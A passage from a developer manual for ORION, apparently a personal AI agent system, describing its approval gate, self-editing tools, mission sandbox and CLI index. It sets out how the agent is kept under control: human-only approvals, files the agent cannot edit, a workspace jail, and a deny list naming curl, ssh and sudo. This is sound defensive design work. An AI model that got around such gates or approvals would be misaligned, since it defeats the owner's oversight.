  4. `deny A-7F3K` (or `no`) removes the ticket (`:105-117`). More than one id is refused: "one approval at a time. Read it, then say yes to it" (`:119-124`), so a loop cannot approve a queue unread.
  5. `--chat` calls `grantForChat`: yes to every terminal command for the rest of that chat, up to 8 hours (message `:147-149`). `revoke-chat` withdraws all of them (`orion-lock` does this too).
  6. After a successful grant it spawns `orion-approve-resume <id> <summary> <sessionKey>` detached (`:140-146`) unless `ORION_APPROVE_NO_RESUME` is set.
- **Contracts** — Exit codes: 0 ok, 1 nothing waiting or refused, 2 bad id or more than one argument. Writes grants under `~/.openclaw/orion-gate/approvals/grants/`. The four claims that make it a boundary (`:20-28`): absent from `exec-approvals.json` (I confirmed it has no entry on 2026-10-15); in `FORBIDDEN_SCRIPTS` in `plugin/orion-control/src/selfrepair.ts` so self-repair cannot edit it; writes to `~/.openclaw/orion-gate/`, which is not a mutable root for any catalog action and is not the AUTO-classified `orion-controlled`; and `scripts/orion_v2_strictness_check.sh` re-checks all of them.
- **Calls out to** — plugin `approvals.js` (via `loadPlugin`); `orion-approve-resume` as a child process. No network.
- **History** — `0e0036d` 2026-09-02 the gate "had nobody in it" and gained a human-only grant; `9855d99` 2026-09-26 phases 40-52 added scoped delegation and raw terminal behind in-app approval (`--chat`, `revoke-chat`); `e568abb` 2026-10-06 "an approval now actually runs" added the resume step.
- **Gotchas & lessons** — (1) 2026-10-06, "I approved and nothing happened": the grant is only a permission slip, ORION must re-run the exact call, and nothing told him it existed. (2) A stale deployed plugin lacking `grantForChat` gets a "deploy it first" message rather than a crash (`:96-99`, `:126-129`). (3) The `orion-waiting` CLI (6.9) lists the same tickets read-only.
- **Walk it yourself** — `./scripts/orion-approve` (lists; harmless); `sed -n 54,66p scripts/orion-approve`; `grep -n 'orion-approve' plugin/orion-control/src/selfrepair.ts`; `grep -c 'orion-approve' ~/.openclaw/exec-approvals.json` should be 0.
- **Questions to ask your tutor** — (1) Why is a hash-bound approval not proof of a human? (2) Why does the boundary rely on the script being *absent* from the allowlist, and what re-checks that? (3) Why is `grant()` forbidden from recording the name "local"? (4) Why one approval per invocation? (5) What does `--chat` widen, and what bounds it?

#### `orion-approve-resume`
- **What it is** — A 32-line helper started detached by `orion-approve` right after a grant (2026-10-06). It cannot approve anything. It asks ORION, in the conversation that requested the action, to re-run the exact call, then shows Nick the outcome as a macOS notification (`scripts/orion-approve-resume:3-10`).
- **How it works** — Arguments `<id> <summary> [session key]` (default session `orion-app-v2`, `:18`). It builds the message "[orion-approve] Nick just approved <id> (<summary>). Re-run that exact call now with the same arguments, then tell him in one line what happened. If it fails, say so plainly." (`:20`), runs `~/.openclaw/bin/openclaw agent --session-key <key> --json --message <text> --timeout 240` (300 s outer timeout, `:23-24`), pulls `finalAssistantRawText` out of the JSON with a regex (`:26-27`), and shows it via `/usr/bin/osascript -e 'display notification ...'` titled "ORION - approved <id>" (`:32`), after stripping quotes/backslashes and cutting to 220 characters (`:31`). On any error it notifies "ORION could not run <id>: ..." (`:29`).
- **Contracts** — Sends one model turn through the gateway (a paid cloud-model turn unless the route is local **(inferred, depends on the session's configured model)**). The notification text is the only output; stdio is ignored by the parent.
- **History** — `e568abb` 2026-10-06 introduced it.
- **Gotchas** — It trusts the model's own final text for the notification, so the notification can claim success the model merely asserted; the reply-lint rules of chapter 05 do not apply here **(inferred; the script does not call them)**.
- **Walk it yourself** — `cat scripts/orion-approve-resume` (32 lines). Do not run it: it makes a real gateway turn.
- **Questions to ask your tutor** — (1) Why is the resume a separate detached process? (2) What would happen if the gateway is down when you approve? (3) Why strip quotes before building the AppleScript string?

---

### 10.7 `orion-forge` and `orion-code` (and `orion-agent`): pointers

These three are covered properly in chapter 09 ([09_evals_tests_dev_process.md](09_evals_tests_dev_process.md)); only the essentials are here. Each paragraph below ends with the pointer.

- **`orion-forge`** (295 lines, zsh) — "Orion changes his own code." Stage a Swift source edit, build, install, prove the app still launches, and undo automatically on failure (`scripts/orion-forge:2-27`). Three gates: PATH (only Swift sources in `native/Orion`, never the plugin, the gate, or the script itself), BUILD (must compile), LAUNCH (must still start; an unfetched Contacts key once compiled and then aborted on launch). Every applied change is a git commit. Commands: `apply <relative-path> <content-file> [message]`, `revert`, `status`. It is a human-run program, not on the model's allowlist. See chapter 09.
- **`orion-code`** (943 lines, python3) — "Orion writes his own code, offline, on the local model" (`scripts/orion-code:2-5`). Asks Ollama for whole files rather than diffs (a 27B model's diffs had wrong line numbers and overlapping hunks), works in a git worktree, checks edits against the installed plugin's forbidden surfaces through `lib/orion-selfdev-policy.mjs` (10.5), must pass a check command before committing, has an iteration and wall-clock budget, and never pushes or installs. Subcommands include `run "<task>" --file <path> [--check "<cmd>"] [--iterations N]`, `queue`, `status`. See chapter 09.
- **`orion-agent`** (382 lines) — "the unattended local development loop": `doctor`, `plan`, `init`, `run [--hours N]`, `status`, `brief`, `resolve`, `bench`, `commands`. `run` refuses unless `~/.openclaw/orion-controlled/agentic-config.json` says `"enabled": true`; that file is outside the repo, so the agent cannot switch itself on (`scripts/orion-agent:21-32`). Backed by `scripts/lib/agentic/*`. See chapter 09.

---

### 10.8 `orion-session` and `orion-mission`

#### `orion-session`
- **What it is** — The command-line **client** for focus sessions, driven by the model, by Nick and by cron-like callers. Orion.app owns the session; this script only asks it over a unix socket. It has no fallback by design: a script that could start a session while the app was down would be a second writer on `focus-state.json`, "the bug that quietly ate Nick's supplement ticks" (`scripts/orion-session:3-10`). It is on the model's exec allowlist (checked 2026-10-15, last used command `orion-session finish`).
- **Where** — `scripts/orion-session` (379 lines): header 2-57; `SOCKET` 62-63; `ALIASES` 66-67; `historyRecords` 75-80; `ask()` 105-150; `duration`/`enforcementLine`/`describe` 152-222; `main()` 224-377 with cases `status` 232, `today` 236, `recover` 246, `start` 263, `shorten` 319, `preflight` 326, `arm` 331, `release` 339, simple verbs 344-350.
- **How it works**
  1. Socket path `ORION_SESSION_SOCKET` or `~/.openclaw/orion-session.sock` (`:62-63`). `ask()` writes one JSON line and reads one JSON line, with a 5 s timeout; a missing socket file or `ECONNREFUSED` (a stale socket from a killed app) both become "Orion is not running, so there is nothing to ask. Start Orion.app first." (`:105-147`). Failure exit code is 3 for that case.
  2. Every command carries a `requestId` (`randomUUID`); the app refuses a repeat, so a retry after a timeout is safe and the reply says `duplicate: true`, printed as "(already done)" (request built at `:229`).
  3. Aliases map natural words to commands: `end, stop, done, complete, wrap` to `finish`; `cancel, quit, give-up` to `abandon`; `begin` to `start`; `unpause, continue` to `resume`; `end-break` to `skip` (`:66-67`). Added 2026-10-07 after "end my focus session" produced "unknown command" and ORION's visible thinking said a tool had failed (`26baa71` 2026-10-08).
  4. `start "<task>"` has three shapes: blocks (`--blocks 3 --focus 50 --rest 10`), a total (`--minutes 10..600` or `--until HH:MM`, from which blocks are computed: about 50-minute blocks with 10-minute breaks when total is at least 70, `:306-313`), or `--sequence "20 work, 5 break, 40 work"` (parsed by `lib/focus/sequence.mjs`, optionally resumed part-way with `--from-phase N --elapsed M`). `--sequence` cannot combine with the other duration flags (`:270`). `--clips a,b` picks ambient audio.
  5. `recover` restarts what was left of the last ended session from `focus-history.jsonl`; `today [--day YYYY-MM-DD]` totals the day (`lib/focus/day-total.mjs`); `--dry-run` prints `DRY RUN <request>` and sends nothing (`:353-356`).
  6. `preflight` lists the apps ORION would allow ("CONFIRM FIRST"); `arm --level gentle|guided|firm|shield --allow com.a,com.b` turns enforcement on; **`release` has no requestId and no session precondition**, "the escape hatch ... deliberately the simplest command" (`:339-343`, header `:34-41`).
- **Contracts** — Request shape `{op, requestId, ...}`; reply `{ok, error?, duplicate?, ...}`; `--json` prints it raw and exits 0/1 by `ok`. State lives in the app's `~/.openclaw/orion-controlled/focus-state.json` and `focus-history.jsonl` (override `ORION_FOCUS_HISTORY`); this script only reads the history file for `recover` and `today`.
- **Calls out to** — Unix socket to Orion.app; `lib/focus/sequence.mjs`, `lib/focus/day-total.mjs`.
- **History** — `77f8484` and `e23fcab` 2026-08-11 (socket, client, Firm enforcement with an escape that cannot fail); `6eb4dca` 2026-10-06 "the app's focus session works again; ORION starts the one he sees" (the "client, never an engine" rule, after on-task state overwrote the session file); `656db4d` 2026-10-06 sequences, recover, day total; `26baa71` 2026-10-08 aliases.
- **Gotchas & lessons** — Enforcement does not run while the app is terminated (header `:50-55`); time while it was down is recorded as downtime, not focus. "Orion.app not running" is a normal state, not a bug. Do not confuse with `orion-ontask` (6.2), which supervises distraction during calendar-planned blocks and never starts a session.
- **Walk it yourself** — `./scripts/orion-session start "test" --dry-run` (prints the request, sends nothing); `./scripts/orion-session status --json` (needs the app running); `sed -n 105,150p scripts/orion-session`.
- **Questions to ask your tutor** — (1) Why is `orion-session` a client with no fallback? (2) How does the `requestId` make retries safe? (3) Why does `release` skip validation and ids? (4) How are `--minutes 150` and `--until 20:00` turned into blocks? (5) What goes wrong if two programs write `focus-state.json`?

#### `orion-mission`
- **What it is** — Autonomous missions: give ORION an outcome, leave, come back to finished work. The design answer to "if Orion stops after generating code, autonomy is not finished": a phase machine enforced **in the script**, not advised to a model (`scripts/orion-mission:3-16`). It is on the exec allowlist (confirmed 2026-10-15).
- **Where** — `scripts/orion-mission` (1082 lines): constants 79-135 (`ROOT`, `DEFAULTS`, `RUNNABLE`, `ARG_POISON`, `NAME_POISON`, `PRICES`, `TERMINAL`); durable state 160-300; `jailed` 306; `vetCommand` 341; `runInWorkspace` 358; brain 389-516 (`costOf`, `askOpenclaw` 419, `askOllama` 457, `think` 475); `budgetVerdict` 518; `canComplete` 530; prompts `CONTRACT` 550, `ACTION_MENU` 577; phases 594-700; `stepOnce` 701-900; CLI 946-1082.
- **How it works**
  1. Phase machine: `PLAN -> EXECUTE -> CHECKPOINT -> TEST -> INSPECT -> FIX -> RETEST -> COMPLETE` (`:7`; cases in `stepOnce` at `:734-874`). `MAX_FIX_ROUNDS = 4` (`:90`).
  2. **The model only decides; the script executes.** Agent `main` cannot run `node` (exec allowlist), so a model turn structurally cannot build or test. The model is asked for ONE JSON object per turn from an `ACTION_MENU`: `write_file`, `run`, `read_file`, `note_decision`, `execute_done`, `need_human`, `need_permission`, `unsafe` (`:577-592`). `CONTRACT` opens "You are ORION running an autonomous mission. You do not have tools here."
  3. **Workspace jail.** `jailed()` resolves every path with `realpathSync` and refuses anything outside `~/.openclaw/orion-controlled/missions/<id>/workspace`, including via links (`:306-319`). `vetCommand` allows only `node` (as `process.execPath`, so no PATH lookup), `python3`, `ls`, `cat`, `wc`, `grep` (`:100-107`), at most 12 arguments of at most 300 characters, no `..`, `~`, shell metacharacters, absolute paths, or names like `sudo`, `curl`, `ssh`, `osascript` (`:113-114`, `:341-356`). No package managers: "a mission that can `npm install` can run arbitrary postinstall code, which is the whole sandbox gone." Commands run with a stripped environment `{PATH:"/usr/bin:/bin", HOME: <workspace>, LANG}` so exported API keys are invisible (`:358-372`) and a 60 s timeout (`CMD_TIMEOUT_MS`).
  4. **Completion gate.** `canComplete = hasPassingVerification && criteria.length > 0 && criteria.every(met)` where a passing verification is a recorded test run that exited zero (`:526-531`). In `COMPLETE`, if that fails the mission goes back to `TEST` with a "complete-rejected" event (`:874-882`).
  5. **Budgets are terminal states, not crashes.** Defaults `maxSteps 40`, `maxMinutes 30`, `maxUsd 0.50` (`:86`); `budgetVerdict` returns a reason for each (`:518-523`). Terminal statuses: `succeeded, needs_human, needs_permission, budget_exhausted, unsafe, aborted` (`:126-133`). Six recorded errors end in `needs_human` (`:896`).
  6. **The brain.** `think()` tries `askOpenclaw` first: `~/.openclaw/bin/openclaw agent --session-key agent:main:mission-<id> --timeout 180 --json --message-file <file>`, with the prompt saved under the mission's `brain/` directory as an audit trail (`:419-455`). If that fails or returns unparseable JSON twice it falls back to local Ollama `gpt-oss:20b` at `http://127.0.0.1:11434/api/generate` (`:457-466`, `:475-500`). Cost is computed from a `PRICES` table (cache reads about 0.1x, writes about 1.25x) because "every turn re-reads ORION's ~17k-token persona from cache" (`:116-120`).
  7. **Durability.** Per mission: `mission.json` (atomic tmp+rename), `mission.json.bak`, and append-only `journal.jsonl`; a corrupt file falls back .json to .bak to last parseable journal line (`:160-187`, `:227`). `acquireLock` breaks a lock older than 5 minutes (`LOCK_STALE_MS`) only with `resume` (`:271`).
- **Contracts** — CLI: `start "build X" [--steps N] [--minutes N] [--usd N] [--run]`, `run <id>`, `step <id>`, `status [id]`, `list`, `resume <id>`, `abort <id> [why]` (header `:57-63`). Hand-written validation (`asText`, `asCount`) rather than zod so it runs bare with no `node_modules` (`:151-170`).
- **Calls out to** — the OpenClaw gateway (a model turn per step), Ollama (fallback), and processes inside the jail. It mirrors OpenClaw TaskFlow's vocabulary (revision, blocked, waiting) but TaskFlow is inspect-only from the CLI, so the JSON mission record fills the orchestration gap (header `:19-34`).
- **History** — `d9cf665` 2026-08-11 created the `orion-*` toolbelt; it is the only commit in `git log` for this file.
- **Gotchas & lessons** — Missions write only dependency-free code (Node builtins, plain browser JS). The model can lie in `criteria.met`, but cannot fake a zero exit of a real process. Missions use the gateway as the brain, so they are metered by the same `usd` cap they carry.
- **Walk it yourself** — `./scripts/orion-mission list` (read only); `sed -n 526,531p scripts/orion-mission`; `sed -n 306,356p scripts/orion-mission` for the jail and the vetting.
- **Questions to ask your tutor** — (1) Why is "the model is not the one holding the pen" the central design rule? (2) Why can a prompt injection in a test fixture not widen the jail? (3) What makes `canComplete` unfakeable? (4) Why are exhausted budgets resumable states? (5) Why is the gateway primary and Ollama only a fallback?

---

### 10.9 The `orion-brain*` family and other brief rows (reset-session, computer, skill, shortcut, interface)

#### The `orion-brain` family (Basic Memory over the Obsidian vault)
- **What it is** — Three scripts around ORION's long-term "brain": the local Obsidian vault `~/Documents/orionBrain`, managed through Basic Memory (project name `orion`). OpenClaw's embedded runner does not pass MCP servers, so the brain's MCP tools never reached ORION; `orion-brain` wraps Basic Memory's own CLI instead (`scripts/orion-brain:2-8`, 2026-10-05).
- **Where** — `scripts/orion-brain` (105 lines), `scripts/orion-brain-seed` (149), `scripts/orion-brain-manual` (92).

**`orion-brain`** (allowlisted, like `orion-recall`)
- **How it works**: Binary `~/.local/bin/basic-memory`; helper `bm(args)` runs `basic-memory tool <args> --project orion` with a 60 s timeout (`:32-35`). Inputs go through `clean()`, which strips control characters and caps length (`:36`). Commands (`:38-102`): `search "<words>"` (up to 6 notes, 700 characters each, from `search-notes`), `read "<title>"` (`read-note`), `context "<title>"` (`build-context memory://<title> --plain`), `recent` (`recent-activity --timeframe 7d`), `learn "<title>" "<category>" "<fact>"`, `canvas-courses`, `canvas-refresh <id> <course note> [--apply]`.
- **`learn`** is the memory *write* path: it builds the line `- [<category>] <fact> (<YYYY-MM-DD>)` (fact capped at 400 characters, category lower-cased and stripped to letters, hyphen and space, `:82-86`). If the note does not exist it creates it in folder `20 Areas/Learned` with `## Learned` and `## Relations` `- about [[Nick]]`; otherwise it adds a `## Learned` heading if missing and appends the line (`:87-97`).
- **Canvas side** (7.4): `canvas-courses` shells to `scripts/orion-connect canvas-courses` and filters out courses excluded in the school note; `canvas-refresh` plans a refresh of an existing course note from `canvas-course <id>`, previews by default, and `--apply` writes the marked source section with backups to `~/.openclaw/orion-controlled/canvas-backups`, then asks Basic Memory for a full-text `reindex --project orion --search` (a failure is reported as `indexing: pending`, never hidden) (`:39-71`).
- **Contracts** — Exit 1 on error with the first 300 characters of stderr (`:103-105`), 2 for usage.
- **History** — `cd1bcb6` 2026-10-05 Basic Memory brain and `orion-brain`; `320626f` 2026-10-06 Canvas retrieval and refresh; `15f0775` 2026-10-12 the manual moves into the brain.
- **Gotchas** — The allowlist's recorded last use for `orion-brain` was `add "..."`, a subcommand that does not exist in this script (`usage ... learn`); that is the kind of model slip `orion-learn` (7.11) finds **(inferred from the allowlist's `lastUsedCommand` field; not re-run)**. `learn` is unbounded by dedup: asking twice writes the line twice.

**`orion-brain-seed [--dry-run]`**
- **What it does** — Builds the vault from real sources only: `USER.md`, `SCHEDULING.md`, `life-config.json`, the calendar's classes, the project list and the daily memory files (`scripts/orion-brain-seed:2-17`). Written 2026-10-05 after Nick: "the entire obsidian brain sucks ... I check the graph and see basically nothing" (about 40 notes, nearly all about ORION's internals, none about Nick).
- **How it works** — `note(folder, title, {observations, relations, body})` writes Basic Memory notes with `- [category] fact` observations and `- relation [[Note]]` links. **Re-running rewrites only notes marked `seeded: true`**: a note without that marker is "his or ORION's own" and is never touched (`:30-34`), and the `## Learned` section of a seeded note is carried over (`:35-36`). After writing it runs `basic-memory reindex` (300 s) (`:147`). Vault override `ORION_BRAIN_VAULT`. A hard-coded course table `COURSES` starts at `:57`; a failed reindex only prints a hint (`:148`).
- **Gotchas** — The seeder holds real personal facts (course codes, locations); do not paste its output outside your machine.

**`orion-brain-manual [--dry-run]`**
- **What it does** — Moves ORION's manual out of the every-turn prompt into the brain (2026-10-12). The workspace files (`AGENTS.md`, `TOOLS.md`, `SCHEDULING.md`, `PLAYBOOK.md`, `USER.md`, `SOUL.md`, `SELF.md`) cost about 18k tokens per call and OpenClaw cut `AGENTS.md` at 20,000 characters, so "Dates", "Memory and Brain" and "Safety and communication" never reached the model (`scripts/orion-brain-manual:4-9`). Nick's idea: a small core prompt and let ORION look the rest up.
- **How it works** — `sections(text)` splits each source on `## ` headings (`:34-42`). For each section it writes a note `ORION Manual - <Area> - <heading>` into `<vault>/90 System/ORION Manual/` with front matter (`type: manual`, tags) and a "Generated from workspace ... edit the workspace file, not this note" line, plus an index note `ORION Manual - Index` (`:44-76`). It **deletes every `.md` in that folder first** ("generated: replace wholesale", `:81`) then rewrites. Env: `ORION_WORKSPACE`, `ORION_BRAIN_VAULT`.
- **Gotchas & lessons** — Never edit those notes by hand, the next run erases the edit. Chapter 03 covers how the small core prompt looks these notes up.
- **Walk it yourself (family)** — `node scripts/orion-brain-manual --dry-run` (prints the index and a section count; writes nothing); `node scripts/orion-brain-seed --dry-run`; `node scripts/orion-brain search "dates"` (reads the vault via Basic Memory); `sed -n 81,97p scripts/orion-brain`.
- **Questions to ask your tutor** — (1) Why was the brain wrapped in a CLI instead of an MCP server? (2) What does the `seeded: true` marker protect? (3) How does `learn` guarantee a new note is linked to Nick? (4) Why does `canvas-refresh` default to preview? (5) What problem did moving the manual into the brain solve, and what does it cost on every turn that needs a rule?

#### Brief rows: the rest of 10.9

| CLI | What it does | Key lines | Notes |
|---|---|---|---|
| `orion-reset-session` (127, zsh) | Retires a "poisoned" session: after `orion_task_run` was broken the `orion-app` transcript held 56 messages of it failing, and ORION kept refusing without calling the tool, "ordinary in-context learning doing exactly what it should" (header `:4-14`) | header | human tool |
| `orion-computer` (156, node) | Phases 53-55 computer use (accessibility tree, screenshot fallback, click/type/key) through OrionMacBridge. Deliberately absent from the raw exec allowlist: the plugin calls it with argv only after catalog, provenance, taint and approval gates have run, and for click/type/key a human has approved the exact args by hash | header `:2-14` | same division of labour as `orion-agenda-change` |
| `orion-skill` (159, node) | ORION writes his own skills (Nick, 2026-09-02): `list`, `show <name>`, `write <name> --description --body`, `disable <name>`. Writes only under `~/.openclaw/workspace/skills/<name>/`; name must match `^[a-z0-9][a-z0-9-]{1,63}$`; never deletes (`disable` renames aside); keeps a copy of every overwritten version; refuses credential-shaped text (`SECRET_SHAPES`, `:46-53`). Needed because ORION has no `file_write` tool | `:30-60` | on the allowlist |
| `orion-shortcut` (43, node) | `list` and `run "<name>" [text]` for macOS Shortcuts whose names start with `ORION ` only, via `/usr/bin/shortcuts` (20 s list, 60 s run, 2000 characters of output kept). The name prefix is Nick's opt-in; "the `--folder-name` filter lists everything when the folder is missing, so it cannot be the boundary" | `:15-43` | 2026-09-30; on the allowlist |
| `orion-interface` (131, zsh) | Launches the standalone interface: reuse or start the warm TTS daemon, check the OpenClaw gateway, start the interface bridge, open it; `--no-open`, `--status` (changes nothing) | header | human |

---

### 10.10 Brief rows: voice and macOS setup

| CLI | What it does | Notes |
|---|---|---|
| `orion-sign-setup` (162) | Creates a stable local code-signing identity once. Ad-hoc signing (`codesign -s -`) makes macOS identify the app by cdhash, a different one every rebuild, so Microphone and Accessibility grants and Keychain items are lost on each build (header) | see also `orion-identity-check`, `orion-permissions` in 9.7 |
| `orion-mic-doctor` (133) | Push-to-talk needs four separate things to be true and fails silently otherwise; this checks each and says which is missing, starting with "Orion.app is running, and is the copy you think it is" | on the model's allowlist |
| `orion-enroll-voice` (342) with `orion_enroll_voice.py` | Records several samples of Nick saying "Orion", measures how much his own samples differ, and sets the voice-ID acceptance bar from that measurement "rather than from a number someone invented" | one-time human setup |
| `orion-voiceid-install` (100) | Installs and starts the voice-ID daemon (`orion_voiceid_daemon.py`) as a LaunchAgent; `--status`, `--remove` (2026-09-29) | label family `com.nickmadaio.orion.*` (see 10.4 gotchas) |
| `orion-tts-install` (98) | Same for the voice daemon `orion_tts_daemon.py`, which "was only ever started by hand" (2026-09-29); `--status`, `--remove` | label `com.nickmadaio.orion.tts` |
| `orion-local-tts` (114) | Thin client OpenClaw's `tts-local-cli` provider spawns once per spoken reply as `orion-local-tts OUTPUT_PATH TEXT`; talks to the warm daemon socket `~/.openclaw/orion-tts.sock` (see `orion_tts_client.py`) | the daemon socket is also named in the scripts-index fragment |

**Questions to ask your tutor (10.10)** — (1) Why does ad-hoc signing break Microphone permission on every rebuild? (2) Why is the voice-ID bar measured, not chosen? (3) Why a warm daemon plus a thin client for TTS?

---

### 10.11 Brief rows: benchmarks and probes

| CLI | What it does | Notes |
|---|---|---|
| `orion-bench` (324) | Personal benchmark runner. Runs only the cases checkable without a model (memory recall); conversational and autonomy cases are scored by a human, "pretending otherwise would produce a green suite that means nothing" (header). `--live` also drives real agent turns end to end and costs money (`scripts/orion-bench:19`); it includes cases such as `live-02` recall and `live-04` decline-to-invent (named in `orion-learn`'s proposal text, 7.11) | also the TEST step in the `orion-learn` pipeline |
| `orion-conversation-bench` (42) | Runs `lib/conversation-bench/suite.json` through `core.mjs` (`SYSTEM`, `grade`, `shuffled`), `--repeats N` (default 3), `--seed N` (default 42) | chapter 09 covers the eval suites |
| `orion-probe-agent` (148) | Captures exactly what `openclaw agent --json` returns, because the reply field has moved between releases (`payloads[].text`, `text`, `reply`, `message`, `content`) | diagnostic |
| `orion-probe-app` (171) | Runs the Mac app's own invocation verbatim to answer "why does the CLI work but the app not" | diagnostic |
| `orion-probe-plugin` (95) | Is the orion-control plugin loaded, and why is `exec` in the tool list: dynamic tool discovery (`tool_search`, `tool_call`) or a loading failure | on the model's allowlist |
| `orion-probe-tools` (115) | Why is `orion_task_run` failing: prime suspect is trust hardening, where provenance is minted from harness hooks and fails closed if the channel emits no `message_received` | on the model's allowlist |

**Walk it yourself (10.11)** — `sed -n 1,20p scripts/orion-bench`; read the header of each probe; these probes call the real gateway, so do not run them without meaning to.

---



---

## 11. CLI index: every executable in `scripts/`

How to read it: one row per entry in `scripts/` (171 files plus the directories `eval`, `lib`, `connectors`, `__pycache__`). "caller" says who runs it: **model** (the OpenClaw agent through the exec allowlist), **cron** (OpenClaw cron or launchd), **app** (the Swift Mac app), **human** (Nick in a terminal or a gate/CI script). Rows were built from each script's own header plus grep for callers; rows marked as header-derived (the last block, from `orion-agent` onward in alphabetical order) were re-checked on 2026-10-15 against grep results for callers (plugin source, scripts, native, and the path patterns in the exec allowlist) and against each script's header or code; a caller or side effect marked (inferred) was not confirmed by reading the whole script. Language is from the shebang. Directory-level rows for `scripts/lib/*` are in section 2, 4 to 8 and 10 where they were covered; the pure Python gate checks (`orion_v2_*`) are chapter 09 territory.

| name | language | purpose | caller | side effects |
|---|---|---|---|---|
| orion-agenda | node | Read-only calendar and to-do reader with date grounding: today, upcoming, day, deadlines, tasks. | model/human | None (reads bridge); prints events with identifiers. |
| orion-agenda-change | node | Typed calendar and reminder mutations with readback: add, remove-title, task-add, task-done, tasks-sweep. | app (plugin typed actions) | Creates/deletes Calendar events and Reminders via bridge; not on exec allowlist. |
| orion-agent | node | Unattended local development loop (agentic dev loop driver; chapter 09) | human; spawned by orion-projects (`scripts/orion-projects:25`) and orion-project-agent; no cron caller found (inferred) | writes run records and worktree files; calls local model |
| orion-approve | node | Nick saying yes: the one act ORION cannot perform; redeems an approval ticket | human/app only; never the model (absent from the exec allowlist, in FORBIDDEN_SCRIPTS: `plugin/orion-control/src/approvals.ts:53-55`) | writes approval grant; starts orion-approve-resume |
| orion-approve-resume | node | After approval, re-runs the exact approved call in the session and reports the result | app (spawned by orion-approve) | runs the approved action; may message the session |
| orion-attention | node | Reads/writes the attention queue: list, rank, explain (section 5) | human only; no model, cron or app caller found (not wired, see section 5) | writes attention store file |
| orion-attention-collect | node | One-pass collection: fixture/source files into queue, rank, write Today feed, print digest | human only; no cron or app caller found (not scheduled, see section 5.16) | writes attention store and today feed |
| orion-authority | node | Reports ORION's authority per capability across plugin gate and exec allowlist (four levels) | human/model | none (reads config and source); JSON output |
| orion-automation | node | Nick's half of automations: turns a proposal into something that runs (section 10) | human | writes automation record and installs schedule |
| orion-automation-run | node | Scheduler-only entry that calls automationTick | cron/launchd | runs due automations; writes history |
| orion-backup | bash | Encrypted backup of ORION state; secrets excluded (section 9.4) | human | writes ~/Documents/OrionBackups/*.enc; reads Keychain item |
| orion-bench | node | Memory-recall benchmark cases checkable without a model | human | reads memory files; writes results |
| orion-brain | node | ORION's access to the Obsidian brain (Basic Memory over ~/Documents/orionBrain): search, read, write notes, Canvas course refresh | model (allowlisted) | reads/writes vault notes; with canvas-refresh --apply edits course notes |
| orion-brain-manual | node | Moves ORION's manual (workspace files) into the brain so turns stop carrying ~18k tokens | human | writes brain notes |
| orion-brain-seed | node | Builds the Obsidian brain from what ORION already knows; --dry-run | human | writes vault notes |
| orion-budget | node | Token and call ceilings against daily and per-task budgets (section 9.5) | human (inferred; only a comment in `plugin/orion-control/src/self-development-scheduling.ts` mentions it, no cron caller found) | reads sessions; budgets.json defaults; exit 1 over ceiling |
| orion-checkin | node | Follow-through loops: add, started, done, defer, cancel, list, tick; escalating reminders to the phone. | model/app | Writes checkins.json, life-history.jsonl; tick output becomes iPhone notifications. |
| orion-code | python | ORION writes his own code offline on the local model (Ollama on loopback) | human/agent | writes code files; local model calls only |
| orion-computer | node | Computer use: accessibility tree, screenshot, click/type/key via OrionMacBridge (Phases 53-55) | plugin executor | controls the Mac screen/input; needs consent gate |
| orion-connect | node | Lists connectors and whether each works now; calls/creates connectors (section 7) | model | network GETs to connector hosts; writes connector spec files |
| orion-connect-admin | node | Nick's switches for connectors (allow-writes etc.); deliberately not on the exec allowlist | human | edits connector permissions |
| orion-conversation-bench | node | Conversation benchmark, dry run by default | human | model calls only with explicit inference flag; writes results |
| orion-costs | node | Inference-ledger cost summary (section 9.5) | human | none |
| orion-cron-deliver | node | Wraps a cron command; forwards output to Discord only if non-empty, matching --match, not a duplicate, and past the minimum interval. | cron | Runs the wrapped command; writes cron-delivery.json and cron-delivery-history.jsonl; calls orion-discord-alert (Discord message). |
| orion-daily | node | Nightly summary of the task ledger into the day's memory file, then gzip-archive and remove those rows. | model/cron | Writes ~/.openclaw/workspace/memory/DAY.md block; archive/ledger-DAY.jsonl.gz; rewrites task-ledger.jsonl. |
| orion-deploy | bash | Test-gated install of the plugin with rollback (section 9.1) | human | builds, copies to ~/.openclaw/extensions/orion-control, restarts/loads plugin |
| orion-discord-alert | node | Posts one short plain-text alert (max 1500 bytes) to Nick's private Discord channel by webhook, with mentions disabled. | model/cron/human | HTTPS POST via curl to Discord webhook from .env; refuses in eval mode but exits 0; exits 2 if not enabled. |
| orion-doctor | zsh | Live-probe diagnosis of the whole stack (section 9.2) | model (allowlisted)/human/app | read-only; --live-agent makes one paid model call |
| orion-enroll-voice | zsh | Records samples of "Orion" and sets speaker-verification threshold | human | records microphone; writes voice profile |
| orion-eval | python | Permanent evaluation harness from docs/planning/v2/evals; "do actual tests" asks run against the real brain (legacy Python-side harness) | human; orion-eval-schedule/-grade/-run, orion-log-audit reference it | writes run JSON to `<repo>/planning/v2/evals/runs` per the code (`scripts/orion-eval:47-50`); the repo's real folder is `docs/planning/v2/evals`, so the path looks wrong (inferred); `run` calls the live model (paid) |
| orion-eval-grade | node | Grades a run file with scripts/lib/eval/grade.mjs and prints scores | human, orion-eval-run | reads only; prints grades |
| orion-eval-run | node | Runs scenario JSON through the real phone route (orion-remote handle, chat mode) in an isolated brain session | human | calls the live brain (paid model); eval mode blocks real sends, but calendar, reminders and health changes DO happen (header); writes out.json |
| orion-eval-schedule | node | Asks the real ORION to change a sandbox day; scores resulting calendar state against expectations | human; named in orion-remote, bridge-path.mjs | writes sandbox eval-calendar.json; paid model calls; real calendar untouched |
| orion-finance | node | Read-only balances/spending from the summary the app writes after each bank refresh | model | reads finance summary file |
| orion-focus | node | Lockdown mode: lock Nick onto the task on the Mac (strikes, local judge; section 6.6) | human only; retired from the model's allowlist (`6eb4dca`), still named in `plugin/orion-control/src/exec-routing.ts:36`, `automation.ts` and `selfrepair.ts` | Writes `focus.json`; `open -a` on allowed apps; `git`/`orion-agenda` reads; local Ollama judge on `plead`; runs Shortcuts `Orion Focus On/Off`. Does not lock phone apps (section 6.6). |
| orion-focus-report | node | Prints last N focus days (--file, --days, --now, --json) | human (not allowlisted; no caller found) | none |
| orion-forge | zsh | ORION edits his own Swift: stage, build, install, prove it runs, auto-undo | model/human (gated) | rewrites app source, rebuilds, reinstalls |
| orion-gmail-latest | node | Newest inbox thread, read-only (--full for body) | model | Gmail read via gog vault |
| orion-gmail-search | node | Gmail search, read-only (--full) | model | Gmail read via gog vault |
| orion-gog | node | Runs the `gog` (Gmail vault) CLI, passing the GOG_KEYRING_PASSWORD value read from the repo-root .env; prints nothing secret | human/model (no repo caller found) | spawns gog with the env var set; the .env file is read, never written |
